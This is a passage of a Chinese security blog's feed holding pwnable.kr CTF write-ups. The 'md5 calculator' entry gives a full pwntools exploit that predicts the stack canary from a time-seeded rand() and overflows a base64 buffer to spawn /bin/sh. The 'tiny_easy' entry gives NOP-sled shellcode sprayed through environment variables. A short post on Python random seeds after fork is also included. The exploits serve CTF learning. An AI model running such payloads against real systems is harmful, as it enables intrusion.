&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[ Knight ] 50 HP / 0 Mana&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    [ 1 ] Crash&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        Deals 20 Damage.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    [ 2 ] Frenzy&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        Deals 40 Damage, But You Lose 20 HP.&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后对手是个怪兽，按照怪兽儿子，怪兽妈妈这样的顺序，然后正常打是打不过的。&lt;/p&gt;
    
    </summary>
    
      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
    
    
      <category term="安全" scheme="http://weaponx.site/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="pwn" scheme="http://weaponx.site/tags/pwn/"/>
    
      <category term="UAF" scheme="http://weaponx.site/tags/UAF/"/>
    
      <category term="整形溢出" scheme="http://weaponx.site/tags/%E6%95%B4%E5%BD%A2%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>md5 caculator Writeup[pwnable.kr]</title>
    <link href="http://weaponx.site/2017/03/03/md5-caculator-Writeup-pwnable-kr/"/>
    <id>http://weaponx.site/2017/03/03/md5-caculator-Writeup-pwnable-kr/</id>
    <published>2017-03-03T08:52:11.000Z</published>
    <updated>2017-03-03T08:53:53.932Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-md5-caculater"><a href="#0x00-md5-caculater" class="headerlink" title="0x00 md5 caculater"></a>0x00 md5 caculater</h2><p>下载下来直接运行，提示缺<code>libcrypto</code>库，但是我却安装过了<code>openssl</code>。于是在lib下看，确实是没有这个库。因为我的环境是<code>ubuntu x86_64</code>装的<code>openssl</code>也是64位的，所以要安装32位的库，使用这个命令:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">sudo apt-get install --reinstall libssl1.0.0:i386</div></pre></td></tr></table></figure>
<p>安装好后反汇编一下，程序很简单。先生成一个随机数token，输入的值和随机数token相等则再输入一串base64编码后的文本，将这个文本解密后用md5加密打印。</p>
<a id="more"></a>
<h2 id="0x01-思路"><a href="#0x01-思路" class="headerlink" title="0x01 思路"></a>0x01 思路</h2><p>程序的漏洞比较明显，在<code>process_hash</code>函数这。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">process_hash</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> v0; <span class="comment">// ST14_4@3</span></div><div class="line">  <span class="keyword">void</span> *ptr; <span class="comment">// ST18_4@3</span></div><div class="line">  <span class="keyword">char</span> v3; <span class="comment">// [sp+1Ch] [bp-20Ch]@1</span></div><div class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+21Ch] [bp-Ch]@1</span></div><div class="line"></div><div class="line">  v4 = *MK_FP(__GS__, <span class="number">20</span>);</div><div class="line">  <span class="built_in">memset</span>(&amp;v3, <span class="number">0</span>, <span class="number">0x200</span>u);</div><div class="line">  <span class="keyword">while</span> ( getchar() != <span class="number">10</span> )</div><div class="line">    ;</div><div class="line">  <span class="built_in">memset</span>(g_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(g_buf));</div><div class="line">  fgets(g_buf, <span class="number">1024</span>, <span class="built_in">stdin</span>);</div><div class="line">  <span class="built_in">memset</span>(&amp;v3, <span class="number">0</span>, <span class="number">0x200</span>u);</div><div class="line">  v0 = Base64Decode(g_buf, &amp;v3);</div><div class="line">  ptr = (<span class="keyword">void</span> *)calc_md5(&amp;v3, v0);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"MD5(data) : %s\n"</span>, ptr);</div><div class="line">  <span class="built_in">free</span>(ptr);</div><div class="line">  <span class="keyword">return</span> *MK_FP(__GS__, <span class="number">20</span>) ^ v4;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>其中<code>g_buf</code>是全局变量1024字节，存放base64编码后的文本。<code>v3</code>是局部变量512字节，存放解码后的文本。</p>
<blockquote>
<p>Base64是把3个字节变为4个字节，所以，Base64编码的长度永远是4的倍数</p>
</blockquote>
<p>所以1024字节的base64解码后为<code>1024/4*3=768</code>。而程序只分配的512字节，所以会出现缓冲区溢出。</p>
<p>然而，程序开启了<code>stack canary</code>，需要我们绕过。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">[----------------------------------registers-----------------------------------]</div><div class="line">EAX: 0x0 </div><div class="line">EBX: 0xffffd40c (<span class="string">'a'</span> &lt;repeats 200 <span class="built_in">times</span>&gt;...)</div><div class="line">ECX: 0x0 </div><div class="line">EDX: 0xf7dcf434 --&gt; 0x804c020 --&gt; 0x3a9 </div><div class="line">ESI: 0x0 </div><div class="line">EDI: 0xffffd60c (<span class="string">'a'</span> &lt;repeats 188 <span class="built_in">times</span>&gt;)</div><div class="line">EBP: 0xffffd618 (<span class="string">'a'</span> &lt;repeats 176 <span class="built_in">times</span>&gt;)</div><div class="line">ESP: 0xffffd3f0 --&gt; 0x0 </div><div class="line">EIP: 0x8049074 (&lt;process_hash+226&gt;: mov    eax,DWORD PTR [ebp-0xc])</div><div class="line">EFLAGS: 0x200282 (carry parity adjust zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow)</div><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x8049066 &lt;process_hash+212&gt;:    mov    eax,DWORD PTR [ebp-0x210]</div><div class="line">   0x804906c &lt;process_hash+218&gt;:    mov    DWORD PTR [esp],eax</div><div class="line">   0x804906f &lt;process_hash+221&gt;:    call   0x8048900 &lt;free@plt&gt;</div><div class="line">=&gt; 0x8049074 &lt;process_hash+226&gt;:    mov    eax,DWORD PTR [ebp-0xc]</div><div class="line">   0x8049077 &lt;process_hash+229&gt;:    xor    eax,DWORD PTR gs:0x14</div><div class="line">   0x804907e &lt;process_hash+236&gt;:    je     0x8049085 &lt;process_hash+243&gt;</div><div class="line">   0x8049080 &lt;process_hash+238&gt;:    call   0x8048990 &lt;__stack_chk_fail@plt&gt;</div><div class="line">   0x8049085 &lt;process_hash+243&gt;:    add    esp,0x220</div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0xffffd3f0 --&gt; 0x0 </div><div class="line">0004| 0xffffd3f4 --&gt; 0x804c028 --&gt; 0x0 </div><div class="line">0008| 0xffffd3f8 --&gt; 0xf7dcfc20 --&gt; 0xfbad2288 </div><div class="line">0012| 0xffffd3<span class="built_in">fc</span> --&gt; 0xf7c71a97 (&lt;_IO_vfscanf+1399&gt;:    movzx  ecx,BYTE PTR [ebp-0x15c])</div><div class="line">0016| 0xffffd400 --&gt; 0xf7dcfc20 --&gt; 0xfbad2288 </div><div class="line">0020| 0xffffd404 --&gt; 0x2be </div><div class="line">0024| 0xffffd408 --&gt; 0x804c028 --&gt; 0x0 </div><div class="line">0028| 0xffffd40c (<span class="string">'a'</span> &lt;repeats 200 <span class="built_in">times</span>&gt;...)</div><div class="line">[------------------------------------------------------------------------------]</div><div class="line">Legend: code, data, rodata, value</div><div class="line">0x08049074 <span class="keyword">in</span> process_hash ()</div><div class="line">gdb-peda$ p <span class="variable">$ebp</span>-0xc</div><div class="line"><span class="variable">$1</span> = (void *) 0xffffd60c</div><div class="line">gdb-peda$ shell</div><div class="line">------------------------------------------------------------</div><div class="line">~/pwn/pwnkr/md5_caculater » python</div><div class="line">Python 2.7.6 (default, Oct 26 2016, 20:30:19) </div><div class="line">[GCC 4.8.4] on linux2</div><div class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</div><div class="line">&gt;&gt;&gt; hex(0xffffd60c-0xffffd40c)</div><div class="line"><span class="string">'0x200'</span></div><div class="line">&gt;&gt;&gt;</div></pre></td></tr></table></figure>
<p>可见，0x200字节就覆盖了canary。需要绕过这个canary，首先想到了<code>Memory Leak</code>。但是，程序不存在格式化字符串漏洞；又想能否使用BROP，这个程序是用socat启动的，程序挂了后肯定会rerandom，所以还是不行。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_hash</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@4</span></div><div class="line">  <span class="keyword">int</span> v1; <span class="comment">// edx@4</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [sp+0h] [bp-38h]@1</span></div><div class="line">  <span class="keyword">char</span> v3[<span class="number">32</span>]; <span class="comment">// [sp+Ch] [bp-2Ch]@2</span></div><div class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+10h] [bp-28h]@4</span></div><div class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+14h] [bp-24h]@4</span></div><div class="line">  <span class="keyword">int</span> v6; <span class="comment">// [sp+18h] [bp-20h]@4</span></div><div class="line">  <span class="keyword">int</span> v7; <span class="comment">// [sp+1Ch] [bp-1Ch]@4</span></div><div class="line">  <span class="keyword">int</span> v8; <span class="comment">// [sp+20h] [bp-18h]@4</span></div><div class="line">  <span class="keyword">int</span> v9; <span class="comment">// [sp+24h] [bp-14h]@4</span></div><div class="line">  <span class="keyword">int</span> v10; <span class="comment">// [sp+28h] [bp-10h]@4</span></div><div class="line">  <span class="keyword">int</span> v11; <span class="comment">// [sp+2Ch] [bp-Ch]@1</span></div><div class="line"></div><div class="line">  v11 = *MK_FP(__GS__, <span class="number">20</span>);</div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</div><div class="line">    *(_DWORD *)&amp;v3[<span class="number">4</span> * i] = rand();</div><div class="line">  result = v7 - v9 + v10 + v11 + v5 - v6 + v4 + v8;</div><div class="line">  v1 = *MK_FP(__GS__, <span class="number">20</span>) ^ v11;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>看到了这个函数，其中<code>v11</code>为cancary，只要我们知道随机数，就可以逆推出canary的值。我们找到了随机数的种子为<code>time(0)</code>就是当前系统的时间戳。</p>
<p>这样就好办了，写一个程序来根据token算canary。因为目标程序是用socat启动的，所以当有程序连上目标端口就会启动这个程序，我们得到token后传入我们写的程序。这时候时间戳应该是一样的，根据这个token就可以算出canary。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n[<span class="number">8</span>], i;</div><div class="line">    <span class="keyword">int</span> token = atoi(argv[<span class="number">1</span>]);</div><div class="line">    <span class="keyword">int</span> cookie;</div><div class="line">    srand(time(<span class="number">0</span>));</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</div><div class="line">    &#123;</div><div class="line">        n[i]=rand();</div><div class="line">    &#125;</div><div class="line">    <span class="comment">// v[4]-v[6]+v[7]+cookie+v[2]-v[3]+v[1]+[5]=token</span></div><div class="line">    cookie = token-n[<span class="number">5</span>]-n[<span class="number">1</span>]+n[<span class="number">3</span>]-n[<span class="number">2</span>]-n[<span class="number">7</span>]+n[<span class="number">6</span>]-n[<span class="number">4</span>];</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%x\n"</span>,cookie);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>因为<code>system</code>有了，所以我们需要一个<code>/bin/sh</code>的地址来完成函数调用，这个也比较好解决。因为有一个全局变量，我们把<code>/bin/sh</code>放到全局变量里即可，所以exploit如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</div><div class="line"></div><div class="line"><span class="comment">#io = process("./hash")</span></div><div class="line">io = remote(<span class="string">"127.0.0.1"</span>, <span class="number">10001</span>)</div><div class="line">io.recvuntil(<span class="string">"Are you human? input captcha : "</span>)</div><div class="line">token = io.recv()</div><div class="line"></div><div class="line"></div><div class="line">io.send(token)</div><div class="line">cookie = os.popen(<span class="string">"./x "</span>+token).read()</div><div class="line">cookie = int(cookie, <span class="number">16</span>)</div><div class="line">log.success(<span class="string">"Canary =&gt; [&#123;&#125;]"</span>.format(hex(cookie)))</div><div class="line">payload = <span class="string">"A"</span> * <span class="number">0x200</span> + p32(cookie) + <span class="string">"B"</span> * <span class="number">12</span> + p64(<span class="number">0x8048880</span>) + p64(<span class="number">0x804b3c0</span>) + <span class="string">"/bin/sh\x00"</span></div><div class="line">payload = b64encode(payload) + <span class="string">"/bin/sh\x00"</span></div><div class="line"></div><div class="line">raw_input()</div><div class="line">io.sendline(payload)</div><div class="line">io.interactive()</div></pre></td></tr></table></figure>
<p>结果如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">tiny_easy@ubuntu:/tmp$ python xxx.py</div><div class="line">[+] Opening connection to 127.0.0.1 on port 9002: Done</div><div class="line">[+] Canary =&gt; [0xf5905a00]</div><div class="line"></div><div class="line">[*] Switching to interactive mode</div><div class="line">Welcome! you are authenticated.</div><div class="line">Encode your data with BASE64 <span class="keyword">then</span> paste me!</div><div class="line">MD5(data) : a703c1b84424ff5c8e2f6c5569f3151a</div><div class="line">$ ls</div><div class="line">flag</div><div class="line"><span class="built_in">log</span></div><div class="line"><span class="built_in">log</span>2</div><div class="line">md5calculator</div><div class="line">super.pl</div><div class="line">$ cat flag</div><div class="line">Canary, Stack guard, Stack protector.. what is the correct expression?</div></pre></td></tr></table></figure>
<h2 id="0x02-Refer"><a href="#0x02-Refer" class="headerlink" title="0x02 Refer"></a>0x02 Refer</h2><p><a href="http://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000/001399413803339f4bbda5c01fc479cbea98b1387390748000" target="_blank" rel="external">http://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000/001399413803339f4bbda5c01fc479cbea98b1387390748000</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-md5-caculater&quot;&gt;&lt;a href=&quot;#0x00-md5-caculater&quot; class=&quot;headerlink&quot; title=&quot;0x00 md5 caculater&quot;&gt;&lt;/a&gt;0x00 md5 caculater&lt;/h2&gt;&lt;p&gt;下载下来直接运行，提示缺&lt;code&gt;libcrypto&lt;/code&gt;库，但是我却安装过了&lt;code&gt;openssl&lt;/code&gt;。于是在lib下看，确实是没有这个库。因为我的环境是&lt;code&gt;ubuntu x86_64&lt;/code&gt;装的&lt;code&gt;openssl&lt;/code&gt;也是64位的，所以要安装32位的库，使用这个命令:&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;sudo apt-get install --reinstall libssl1.0.0:i386&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;安装好后反汇编一下，程序很简单。先生成一个随机数token，输入的值和随机数token相等则再输入一串base64编码后的文本，将这个文本解密后用md5加密打印。&lt;/p&gt;
    
    </summary>
    
      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
    
    
      <category term="安全" scheme="http://weaponx.site/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="pwn" scheme="http://weaponx.site/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>tiny_easy Writeup[pwnable.kr]</title>
    <link href="http://weaponx.site/2017/03/02/tiny-easy-Writeup-pwnable-kr/"/>
    <id>http://weaponx.site/2017/03/02/tiny-easy-Writeup-pwnable-kr/</id>
    <published>2017-03-02T10:37:12.000Z</published>
    <updated>2017-03-02T11:21:03.089Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-tiny-easy"><a href="#0x00-tiny-easy" class="headerlink" title="0x00 tiny_easy"></a>0x00 tiny_easy</h2><p>这个文件用sftp传下来看了一下，文件很小只有4k，代码也很少，直接执行则会报错。</p>
<a id="more"></a>
<h2 id="0x01-思路"><a href="#0x01-思路" class="headerlink" title="0x01 思路"></a>0x01 思路</h2><p>直接入口点下断，看为何出现段错误。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">[----------------------------------registers-----------------------------------]</div><div class="line">EAX: 0x0 </div><div class="line">EBX: 0x0 </div><div class="line">ECX: 0x0 </div><div class="line">EDX: 0x0 </div><div class="line">ESI: 0x0 </div><div class="line">EDI: 0x0 </div><div class="line">EBP: 0x0 </div><div class="line">ESP: 0xffffd6e0 --&gt; 0x1 </div><div class="line">EIP: 0x8048054 (pop    eax)</div><div class="line">EFLAGS: 0x202 (carry parity adjust zero sign <span class="built_in">trap</span> INTERRUPT direction overflow)</div><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x804804e:   add    BYTE PTR [eax],al</div><div class="line">   0x8048050:   add    BYTE PTR [eax],dl</div><div class="line">   0x8048052:   add    BYTE PTR [eax],al</div><div class="line">=&gt; 0x8048054:   pop    eax</div><div class="line">   0x8048055:   pop    edx</div><div class="line">   0x8048056:   mov    edx,DWORD PTR [edx]</div><div class="line">   0x8048058:   call   edx</div><div class="line">   0x804805a:   add    BYTE PTR [eax],al</div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0xffffd6e0 --&gt; 0x1 </div><div class="line">0004| 0xffffd6e4 --&gt; 0xffffd819 (<span class="string">"/home/user/pwn/pwnkr/tiny_easy/tiny_easy"</span>)</div><div class="line">0008| 0xffffd6e8 --&gt; 0x0 </div><div class="line">0012| 0xffffd6ec --&gt; 0xffffd842 (<span class="string">"USER=user"</span>)</div><div class="line">0016| 0xffffd6f0 --&gt; 0xffffd84c (<span class="string">"LOGNAME=user"</span>)</div><div class="line">0020| 0xffffd6f4 --&gt; 0xffffd859 (<span class="string">"HOME=/home/user"</span>)</div><div class="line">0024| 0xffffd6f8 --&gt; 0xffffd869 (<span class="string">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games"</span>)</div><div class="line">0028| 0xffffd6<span class="built_in">fc</span> --&gt; 0xffffd8c7 (<span class="string">"MAIL=/var/mail/user"</span>)</div><div class="line">[------------------------------------------------------------------------------]</div></pre></td></tr></table></figure>
<p>可以看出代码很简单，<code>EDX</code>为<code>/home/user/pwn/pwnkr/tiny_easy/tiny_easy</code>，然后<code>mov    edx,DWORD PTR [edx]</code>把<code>EDX</code>的内容重新赋值给<code>EDX</code>。最后<code>call   edx</code>完成调用。</p>
<p>其实说白了就是只要能控制<code>argv[0]</code>就可以控制<code>EIP</code>，因为环境变量也放在栈上，所以我们可以将shellcode放在栈上。但是现在有两个难点：</p>
<ol>
<li>是否有DEP（是否可以执行shellcode）</li>
<li>是否有ASLR（如何将<code>EIP</code>指向shellcode）</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">gdb-peda$ checksec </div><div class="line">CANARY    : disabled</div><div class="line">FORTIFY   : disabled</div><div class="line">NX        : ENABLED</div><div class="line">PIE       : disabled</div><div class="line">RELRO     : disabled</div></pre></td></tr></table></figure>
<p>悲剧的是，既有<code>ASLR</code>也有<code>DEP</code>。但是突然发现这个<code>DEP</code>确没啥效果，栈上还是有执行权限的。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">gdb-peda$ getpid</div><div class="line">2844</div><div class="line">gdb-peda$ shell</div><div class="line">------------------------------------------------------------</div><div class="line">~/pwn/pwnkr/tiny_easy ? cat /proc/2844/maps</div><div class="line">08048000-08049000 r-xp 00000000 08:01 2493481                            /home/user/pwn/pwnkr/tiny_easy/tiny_easy</div><div class="line">f7ffa000<span class="_">-f</span>7ffc000 r--p 00000000 00:00 0                                  [vvar]</div><div class="line">f7ffc000<span class="_">-f</span>7ffe000 r-xp 00000000 00:00 0                                  [vdso]</div><div class="line">fffdd000-ffffe000 rwxp 00000000 00:00 0                                  [stack]</div></pre></td></tr></table></figure>
<p>所以现在首要目标就是突破<code>ASLR</code>，能使得<code>EIP</code>可以指向我们的shellcode。</p>
<h2 id="0x02-Solution"><a href="#0x02-Solution" class="headerlink" title="0x02 Solution"></a>0x02 Solution</h2><p>突破<code>ASLR</code>，想到了之前的堆喷射(Heap Spray)，用大量的滑行区来填充shellcode的前部。只要<code>EIP</code>能落在滑行区就可以执行shellcode。只要部署大量的带有滑行区的shellcode，多次尝试，肯定会有<code>EIP</code>落入滑行区的时候，所以最终的Eploit如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">fromm pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">shellcode  = <span class="string">"\xeb\x11\x5e\x31\xc9\xb1\x32\x80"</span></div><div class="line">shellcode += <span class="string">"\x6c\x0e\xff\x01\x80\xe9\x01\x75"</span></div><div class="line">shellcode += <span class="string">"\xf6\xeb\x05\xe8\xea\xff\xff\xff"</span></div><div class="line">shellcode += <span class="string">"\x32\xc1\x51\x69\x30\x30\x74\x69"</span></div><div class="line">shellcode += <span class="string">"\x69\x30\x63\x6a\x6f\x8a\xe4\x51"</span></div><div class="line">shellcode += <span class="string">"\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"</span></div><div class="line"></div><div class="line">payload = <span class="string">"\x90"</span> * <span class="number">8000</span> + shellcode</div><div class="line"><span class="comment">#p64(0xff9c3844)</span></div><div class="line">env = &#123;&#125;</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">0x100</span>):</div><div class="line">    env[str(i)] = payload</div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    io = process([p32(<span class="number">0xff9c3844</span>)],executable=<span class="string">"/home/user/pwn/pwnkr/tiny_easy/tiny_easy"</span>, env=env)</div><div class="line">    io.interactive()</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-tiny-easy&quot;&gt;&lt;a href=&quot;#0x00-tiny-easy&quot; class=&quot;headerlink&quot; title=&quot;0x00 tiny_easy&quot;&gt;&lt;/a&gt;0x00 tiny_easy&lt;/h2&gt;&lt;p&gt;这个文件用sftp传下来看了一下，文件很小只有4k，代码也很少，直接执行则会报错。&lt;/p&gt;
    
    </summary>
    
      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
    
    
      <category term="安全" scheme="http://weaponx.site/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="pwn" scheme="http://weaponx.site/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>python中Random的坑</title>
    <link href="http://weaponx.site/2017/03/01/python%E4%B8%ADRandom%E7%9A%84%E5%9D%91/"/>
    <id>http://weaponx.site/2017/03/01/python中Random的坑/</id>
    <published>2017-03-01T10:58:44.000Z</published>
    <updated>2017-03-01T11:25:12.458Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前景提要"><a href="#0x00-前景提要" class="headerlink" title="0x00 前景提要"></a>0x00 前景提要</h2><p>在搬砖过程中遇到一个巨坑，有一个python模块实现了一个本地监听多个端口的功能，为了防止监听端口冲突端口使用了python中的<code>random</code>模块中的<code>randint</code>函数来实现随机端口的生成。然而两次调用后却发现一直报<code>error: [Errno 98] Address already in use</code>，明显就是端口被占用。这个就比较奇怪了，因为该模块一次监听5个端口。怎么可能5个端口都会有冲突。</p>
<a id="more"></a>
<h2 id="0x01-排查"><a href="#0x01-排查" class="headerlink" title="0x01 排查"></a>0x01 排查</h2><p>首先想到的就是<code>random</code>是否为伪随机，在查阅了以后发现</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">Warning The pseudo-random generators of this module should not be used <span class="keyword">for</span> security purposes. Use os.urandom() or SystemRandom <span class="keyword">if</span> you require a cryptographically secure pseudo-random number generator.</div></pre></td></tr></table></figure>
<p>确实是伪随机，但是默认随机数生成种子是从<code>/dev/urandom</code>或者是系统时间戳获取的。两次调用也不会是同时调用的，所以种子肯定不会是一样的。</p>
<p>后来经大神提醒有了点眉目，因为两个进程的父进程是同一个进程。进程在导入random模块的时候种子已经选好了。所以不同子进程生成的随机数序列肯定是一样的。</p>
<p>下面写个python验证下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> random</div><div class="line"><span class="keyword">import</span> os</div><div class="line"></div><div class="line"><span class="keyword">if</span> os.fork() == <span class="number">0</span>:</div><div class="line">    <span class="keyword">print</span> <span class="string">"[rand 1] %d"</span> % random.randint(<span class="number">1</span>,<span class="number">100</span>)</div><div class="line">    <span class="keyword">print</span> <span class="string">"[rand 1] %d"</span> % random.randint(<span class="number">1</span>,<span class="number">100</span>)</div><div class="line">    <span class="keyword">print</span> <span class="string">"[rand 1] %d"</span> % random.randint(<span class="number">1</span>,<span class="number">100</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    <span class="keyword">print</span> <span class="string">"[rand 2] %d"</span> % random.randint(<span class="number">1</span>,<span class="number">100</span>)</div><div class="line">    <span class="keyword">print</span> <span class="string">"[rand 2] %d"</span> % random.randint(<span class="number">1</span>,<span class="number">100</span>)</div><div class="line">    <span class="keyword">print</span> <span class="string">"[rand 2] %d"</span> % random.randint(<span class="number">1</span>,<span class="number">100</span>)</div></pre></td></tr></table></figure>
<p>通过执行结果可以发现，确实证实了猜测</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">~ » python test.py</div><div class="line">[rand 2] 51</div><div class="line">[rand 2] 58</div><div class="line">[rand 2] 31</div><div class="line">[rand 1] 51</div><div class="line">[rand 1] 58</div><div class="line">[rand 1] 31</div></pre></td></tr></table></figure>
<h2 id="0x02-解决"><a href="#0x02-解决" class="headerlink" title="0x02 解决"></a>0x02 解决</h2><p>知道了原因，要解决就很简单了。只要在生成随即数的时候重置种子就可以了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> random</div><div class="line"><span class="keyword">import</span> os</div><div class="line"></div><div class="line"><span class="keyword">if</span> os.fork() == <span class="number">0</span>:</div><div class="line">    random.seed()</div><div class="line">    <span class="keyword">print</span> <span class="string">"[rand 1] %d"</span> % random.randint(<span class="number">1</span>,<span class="number">100</span>)</div><div class="line">    <span class="keyword">print</span> <span class="string">"[rand 1] %d"</span> % random.randint(<span class="number">1</span>,<span class="number">100</span>)</div><div class="line">    <span class="keyword">print</span> <span class="string">"[rand 1] %d"</span> % random.randint(<span class="number">1</span>,<span class="number">100</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    random.seed()</div><div class="line">    <span class="keyword">print</span> <span class="string">"[rand 2] %d"</span> % random.randint(<span class="number">1</span>,<span class="number">100</span>)</div><div class="line">    <span class="keyword">print</span> <span class="string">"[rand 2] %d"</span> % random.randint(<span class="number">1</span>,<span class="number">100</span>)</div><div class="line">    <span class="keyword">print</span> <span class="string">"[rand 2] %d"</span> % random.randint(<span class="number">1</span>,<span class="number">100</span>)</div></pre></td></tr></table></figure>
<p>结果也证实了这种解决方案可行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">~ » python test.py</div><div class="line">[rand 2] 7</div><div class="line">[rand 2] 52</div><div class="line">[rand 2] 43</div><div class="line">[rand 1] 16</div><div class="line">[rand 1] 70</div><div class="line">[rand 1] 97</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前景提要&quot;&gt;&lt;a href=&quot;#0x00-前景提要&quot; class=&quot;headerlink&quot; title=&quot;0x00 前景提要&quot;&gt;&lt;/a&gt;0x00 前景提要&lt;/h2&gt;&lt;p&gt;在搬砖过程中遇到一个巨坑，有一个python模块实现了一个本地监听多个端口的功能，为了防止监听端口冲突端口使用了python中的&lt;code&gt;random&lt;/code&gt;模块中的&lt;code&gt;randint&lt;/code&gt;函数来实现随机端口的生成。然而两次调用后却发现一直报&lt;code&gt;error: [Errno 98] Address already in use&lt;/code&gt;，明显就是端口被占用。这个就比较奇怪了，因为该模块一次监听5个端口。怎么可能5个端口都会有冲突。&lt;/p&gt;
    
    </summary>
    
      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
    
    
      <category term="安全" scheme="http://weaponx.site/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="python" scheme="http://weaponx.site/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>unexploitable Writeup[pwnable.kr]</title>
    <link href="http://weaponx.site/2017/02/28/unexploitable-Writeup-pwnable-kr/"/>
    <id>http://weaponx.site/2017/02/28/unexploitable-Writeup-pwnable-kr/</id>
    <published>2017-02-28T13:52:30.000Z</published>
    <updated>2017-03-06T13:47:38.985Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-unexploitable"><a href="#0x00-unexploitable" class="headerlink" title="0x00 unexploitable"></a>0x00 unexploitable</h2><p>看看源代码，很简单的程序</p>
